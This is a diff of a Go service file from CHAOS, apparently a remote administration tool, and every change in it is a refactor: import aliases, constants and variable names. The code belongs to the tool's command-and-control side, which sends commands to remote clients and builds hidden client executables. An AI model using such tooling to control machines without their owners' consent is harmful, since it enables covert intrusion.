@@ -4,12 +4,12 @@ import (
 	"context"
 	"fmt"
 	"github.com/google/uuid"
+	"github.com/tiagorlampert/CHAOS/internal"
 	"github.com/tiagorlampert/CHAOS/internal/utils"
-	"github.com/tiagorlampert/CHAOS/internal/utils/constants"
 	"github.com/tiagorlampert/CHAOS/internal/utils/image"
 	"github.com/tiagorlampert/CHAOS/internal/utils/jwt"
 	"github.com/tiagorlampert/CHAOS/internal/utils/system"
-	auth2 "github.com/tiagorlampert/CHAOS/repositories/auth"
+	authRepo "github.com/tiagorlampert/CHAOS/repositories/auth"
 	"github.com/tiagorlampert/CHAOS/services/auth"
 	"github.com/tiagorlampert/CHAOS/services/payload"
 	"os/exec"
@@ -19,14 +19,14 @@ import (
 
 type clientService struct {
 	AppVersion     string
-	Repository     auth2.Repository
+	Repository     authRepo.Repository
 	PayloadService payload.Service
 	AuthService    auth.Service
 }
 
 func NewClientService(
 	appVersion string,
-	repository auth2.Repository,
+	repository authRepo.Repository,
 	payloadCache payload.Service,
 	authService auth.Service,
 ) Service {
@@ -66,7 +66,7 @@ func (c clientService) SendCommand(ctx context.Context, input SendCommandInput) 
 		return SendCommandOutput{}, fmt.Errorf(res)
 	}
 	if len(strings.TrimSpace(res)) == 0 {
-		return SendCommandOutput{Response: constants.NoContent}, nil
+		return SendCommandOutput{Response: internal.NoContent}, nil
 	}
 	return SendCommandOutput{Response: res}, nil
 }
@@ -118,11 +118,11 @@ func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error)
 }
 
 func (c clientService) GenerateNewToken() (string, error) {
-	authConfig, err := c.AuthService.GetAuthConfig()
+	config, err := c.AuthService.GetAuthConfig()
 	if err != nil {
 		return "", err
 	}
-	return jwt.NewToken(authConfig.SecretKey, jwt.IdentityDefaultUser)
+	return jwt.NewToken(config.SecretKey, jwt.IdentityDefaultUser)
 }
 
 func handleOSType(osType system.OSType) string {
@@ -143,11 +143,11 @@ func runHidden(hidden bool) string {
 	return ""
 }
 
-func handleFilename(osType system.OSType, filename string) string {
+func handleFilename(os system.OSType, filename string) string {
 	if len(strings.TrimSpace(filename)) <= 0 {
 		filename = uuid.New().String()
 	}
-	switch osType {
+	switch os {
 	case system.Windows:
 		return fmt.Sprint(filename, ".exe")
 	default:
